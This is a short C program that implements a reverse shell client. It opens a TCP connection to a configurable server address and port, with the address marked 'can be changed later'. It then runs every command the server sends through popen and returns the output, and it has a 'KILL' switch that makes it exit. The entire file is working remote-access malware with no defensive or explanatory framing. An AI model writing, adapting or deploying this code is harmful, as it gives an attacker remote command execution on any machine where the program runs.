#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/wait.h>
#include <signal.h>

#define SERVER_IP "127.0.0.1" //this can be changed later
#define SERVER_PORT 1337
#define TIMEOUT 5

void alarm_handler(int sig){
	//this willl do nothing on timeout
}

int main(){

	int sock;
	struct sockaddr_in server_addr;
	char buffer[1024], response[4096];

	signal(SIGALRM, alarm_handler);

	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock<0) {
		perror("Socket error");
		exit(1);
	}

	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(SERVER_PORT);
	inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr);

	if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr))<0){
		perror("Connection failed");
		exit(1);
	}

	while (1) {
		memset(buffer, 0, sizeof(buffer));
		int n = recv(sock, buffer, sizeof(buffer) -1, 0);
		if (n <= 0) break;

		buffer[n] = '\0';


		//kill switch
		if (strncmp(buffer, "KILL", 4) == 0) {
			printf("[!]Kill switch recieved. Exiting.\n");
			break;
		}

		alarm(TIMEOUT);

		//executing commands 
		FILE *fp = popen(buffer, "r");
		if (fp == NULL) {
			char fail_msg[] = "command failed or timed out\n";
			send(sock, fail_msg, strlen(fail_msg), 0);
			continue;
		}

		memset(response, 0, sizeof(response));
		fread(response, 1, sizeof(response) -1, fp);
		pclose(fp);

		send(sock, response, strlen(response), 0);

	}

	close(sock);
	return 0;



}
